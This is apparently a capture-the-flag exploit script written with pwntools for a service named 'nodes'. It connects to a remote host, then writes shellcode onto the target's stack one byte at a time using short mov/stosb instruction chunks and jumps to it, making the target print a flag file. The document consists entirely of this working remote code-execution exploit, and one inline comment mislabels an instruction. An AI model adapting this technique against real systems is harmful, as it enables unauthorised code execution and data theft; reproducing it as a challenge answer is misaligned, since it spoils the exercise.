#!/usr/bin/python
from pwn import *

shellcode = asm(shellcraft.cat('/opt/flag',2)+shellcraft.exit())
#p = process('./nodes')
p = remote('a27223a8fb11611e7887102abc71843c-611663668.eu-central-1.elb.amazonaws.com',4321)
#gdb.attach(p)
p.send('\x89\xe7\xeb\x0c') #xor edi,esp
for s in shellcode:
    p.send('\xb0%s\xeb\x0c' % s) #mov al,(byte)
    p.send('\xaa\x90\xeb\x0c') #stosb; nop
p.send('\xff\xe4\xeb\x0c') #jmp esp
p.shutdown("out")
p.interactive()

